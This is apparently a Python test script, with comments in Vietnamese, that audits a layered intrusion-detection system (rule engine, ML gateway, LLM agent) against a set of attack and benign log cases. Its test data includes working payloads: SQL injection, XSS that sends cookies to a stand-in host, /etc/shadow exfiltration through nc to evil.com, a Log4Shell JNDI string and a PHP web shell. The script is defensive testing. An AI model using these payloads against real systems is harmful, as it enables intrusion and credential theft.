"""SENTINEL — AUDIT NĂNG LỰC TỪNG TẦNG trên ma trận nhiều loại tấn công.

MỤC ĐÍCH: kiểm tra có hệ thống rằng mỗi tầng (luật Tier-1 · Cổng ML · LLM Tier-2) phản
ứng ĐÚNG NĂNG LỰC của nó trên nhiều họ tấn công khác nhau, thay vì chỉ thử vài ca lẻ.
Mỗi ca gồm: log THẬT theo định dạng hệ thống nhận, kỳ vọng có phải đe doạ hay không, và
họ kỹ thuật MITRE mong đợi (để đối chiếu ánh xạ).

Chạy:
    .venv/bin/python experiments/audit_tier_capability.py            # đủ 3 tầng (cần LLM)
    .venv/bin/python experiments/audit_tier_capability.py --no-llm   # chỉ Tier-1 + Cổng ML
"""

import argparse
import json
import os
import sys
from typing import Any

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.tier1_filter.ml_gateway import MLGateway  # noqa: E402
from src.tier1_filter.rule_engine import RuleEngine  # noqa: E402

# (tên, log, là_đe_doạ, tiền tố MITRE mong đợi hoặc None nếu không ràng buộc)
CASES: list[tuple[str, dict, bool, str | None]] = [
    # ── Họ tấn công tầng ỨNG DỤNG (có payload) ──────────────────────────────
    (
        "SQLi union-based",
        {
            "Source IP": "203.0.113.77",
            "Destination Port": 80,
            "service": "HTTP",
            "message": "GET /login?id=1' OR '1'='1 UNION SELECT password FROM users--",
        },
        True,
        "T1190",
    ),
    (
        "XSS phản chiếu",
        {
            "Source IP": "203.0.113.9",
            "Destination Port": 80,
            "service": "HTTP",
            "message": 'GET /search?q=<script>document.location="http://evil/"+document.cookie</script>',
        },
        True,
        None,
    ),
    (
        "Path traversal /etc/passwd",
        {
            "Source IP": "203.0.113.55",
            "Destination Port": 80,
            "service": "HTTP",
            "message": "GET /download?file=../../../../etc/passwd",
        },
        True,
        None,
    ),
    (
        "Command injection",
        {
            "Source IP": "203.0.113.61",
            "Destination Port": 80,
            "service": "HTTP",
            "message": "POST /ping host=8.8.8.8;cat /etc/shadow|nc evil.com 4444",
        },
        True,
        None,
    ),
    (
        "Log4Shell JNDI",
        {
            "Source IP": "203.0.113.62",
            "Destination Port": 8080,
            "service": "HTTP",
            "message": "GET / User-Agent: ${jndi:ldap://evil.com/a}",
        },
        True,
        None,
    ),
    (
        "Web shell upload",
        {
            "Source IP": "203.0.113.63",
            "Destination Port": 80,
            "service": "HTTP",
            "message": "POST /upload.php file=shell.php <?php system($_GET['cmd']); ?>",
        },
        True,
        None,
    ),
    # ── Họ tấn công tầng MẠNG (chỉ có đặc trưng luồng) ──────────────────────
    (
        "Brute-force SSH",
        {
            "Source IP": "198.51.100.23",
            "Destination Port": 22,
            "service": "SSH",
            "Total Fwd Packets": 900,
            "Flow Duration": 1200,
            "Flow Pkts/s": 750.0,
        },
        True,
        "T1110",
    ),
    (
        "Brute-force FTP",
        {
            "Source IP": "198.51.100.24",
            "Destination Port": 21,
            "service": "FTP",
            "Total Fwd Packets": 640,
            "Flow Duration": 900,
            "Flow Pkts/s": 711.0,
        },
        True,
        None,
    ),
    (
        "RDP cổng nhạy cảm",
        {
            "Source IP": "198.51.100.25",
            "Destination Port": 3389,
            "service": "RDP",
            "Total Fwd Packets": 400,
            "Flow Duration": 5000,
        },
        True,
        None,
    ),
    (
        "DDoS volumetric",
        {
            "Source IP": "198.51.100.30",
            "Destination Port": 80,
            "service": "HTTP",
            "Total Fwd Packets": 250000,
            "Flow Duration": 10000,
            "Flow Pkts/s": 900000.0,
        },
        True,
        None,
    ),
    (
        "C2 beacon đều đặn",
        {
            "Source IP": "198.51.100.40",
            "Destination Port": 8443,
            "service": "PORT_8443",
            "Total Fwd Packets": 60,
            "Flow Duration": 3600000000,
            "Flow Pkts/s": 0.0167,
        },
        True,
        None,
    ),
    (
        "Exfil khối lượng lớn",
        {
            "Source IP": "198.51.100.41",
            "Destination Port": 443,
            "service": "HTTPS",
            "Total Length of Bwd Packets": 50_000_000,
            "Total Fwd Packets": 120,
            "Flow Duration": 60000000,
        },
        True,
        None,
    ),
    # ── ĐỐI CHỨNG LÀNH TÍNH (không được chặn) ───────────────────────────────
    (
        "HTTPS duyệt web bình thường",
        {
            "Source IP": "192.168.1.50",
            "Destination Port": 443,
            "service": "HTTPS",
            "Total Fwd Packets": 18,
            "Flow Duration": 40000,
            "Flow Pkts/s": 0.45,
        },
        False,
        None,
    ),
    (
        "Truy vấn DNS bình thường",
        {
            "Source IP": "192.168.1.51",
            "Destination Port": 53,
            "service": "DNS",
            "Total Fwd Packets": 2,
            "Flow Duration": 1200,
            "Flow Pkts/s": 1.67,
        },
        False,
        None,
    ),
    (
        "HTTP tải trang tĩnh",
        {
            "Source IP": "192.168.1.52",
            "Destination Port": 80,
            "service": "HTTP",
            "message": "GET /index.html HTTP/1.1 200 OK",
            "Total Fwd Packets": 12,
            "Flow Duration": 30000,
        },
        False,
        None,
    ),
]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--no-llm", action="store_true", help="bỏ qua Tier-2 (không cần LLM)")
    args = ap.parse_args()

    engine = RuleEngine()
    gw = MLGateway()
    if gw.pipeline is None:
        print("[!] CẢNH BÁO: Cổng ML KHÔNG nạp được model — kết quả sẽ không phản ánh đúng.")

    # Any: ba thứ này nạp ĐỘNG (chỉ import khi bật LLM) nên type checker không thể suy ra
    # kiểu; khai báo rõ thay vì để nó suy thành NoneType rồi báo lỗi ở chỗ dùng.
    agent_app: Any = None
    state_cls: Any = None
    loop_detector: Any = None
    if not args.no_llm:
        from src.agent.state import SentinelState as state_cls  # noqa: N813
        from src.agent.workflow import agent_app
        from src.guardrails.state_monitor import loop_detector

    rows = []
    for name, log, is_threat, want_mitre in CASES:
        t1 = engine.evaluate(dict(log))
        t1_action = t1.get("tier1_action", "?")

        ml_action = ml_conf = None
        if t1_action == "ESCALATE":
            ml_action, _r, ml_conf, _sec = gw.evaluate_detailed(dict(log))

        llm_action = llm_conf = llm_mitre = None
        if agent_app is not None and t1_action == "ESCALATE" and ml_action is None:
            loop_detector.reset()
            st = state_cls(current_batch_logs=[dict(log)], current_batch_size=1)
            try:
                ds = agent_app.invoke(st).get("decisions", [])
                if ds:
                    llm_action = ds[-1].get("action")
                    llm_conf = ds[-1].get("confidence")
                    llm_mitre = str(ds[-1].get("mitre_technique", ""))
            except Exception as e:
                llm_action = f"LỖI:{type(e).__name__}"

        final = llm_action or ml_action or t1_action
        # ESCALATE KHÔNG phải phán quyết cuối: nó có nghĩa "chuyển tầng sau xử lý". Khi chạy
        # --no-llm thì tầng sau bị tắt, nên coi ESCALATE là HOÃN (không tính đúng/sai) thay
        # vì tính là bỏ sót — nếu không, thước đo sẽ đổ lỗi oan cho hệ thống.
        deferred = final == "ESCALATE" and agent_app is None
        blocked = final in ("BLOCK_IP", "ALERT", "AWAIT_HITL")
        ok = None if deferred else (blocked == is_threat)
        mitre_ok = (
            None if not want_mitre else (want_mitre in (llm_mitre or "") if llm_mitre else None)
        )
        rows.append(
            {
                "case": name,
                "threat": is_threat,
                "tier1": t1_action,
                "t1_score": t1.get("tier1_score"),
                "ml": ml_action,
                "ml_conf": round(ml_conf, 4) if ml_conf else None,
                "llm": llm_action,
                "llm_conf": llm_conf,
                "llm_mitre": llm_mitre,
                "final": final,
                "correct": ok,
                "mitre_ok": mitre_ok,
            }
        )
        mark = "…" if ok is None else ("✓" if ok else "✗")
        print(
            f"{mark} {name:<30} kỳ vọng={'ĐE DOẠ' if is_threat else 'lành tính':<10} "
            f"T1={t1_action:<9} ML={str(ml_action):<9} LLM={str(llm_action):<11} => {final}"
        )

    n_ok = sum(1 for r in rows if r["correct"] is True)
    n_defer = sum(1 for r in rows if r["correct"] is None)
    n_judged = len(rows) - n_defer
    print("\n" + "=" * 78)
    print(
        f"ĐÚNG {n_ok}/{n_judged} ca CHẤM ĐƯỢC"
        + (f"  ({n_defer} ca HOÃN: escalate, cần LLM)" if n_defer else "")
    )
    wrong = [r for r in rows if r["correct"] is False]
    if wrong:
        print("\nCA SAI (cần sửa):")
        for r in wrong:
            print(f"  ✗ {r['case']}: kỳ vọng threat={r['threat']} nhưng final={r['final']}")
    bad_mitre = [r for r in rows if r["mitre_ok"] is False]
    if bad_mitre:
        print("\nÁNH XẠ MITRE SAI:")
        for r in bad_mitre:
            print(f"  ✗ {r['case']}: nhận {r['llm_mitre']}")

    out = os.path.join(os.path.dirname(__file__), "results", "tier_capability_audit.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump(
            {"total": len(rows), "correct": n_ok, "rows": rows}, f, ensure_ascii=False, indent=1
        )
    print(f"\n[+] JSON: {out}")


if __name__ == "__main__":
    main()
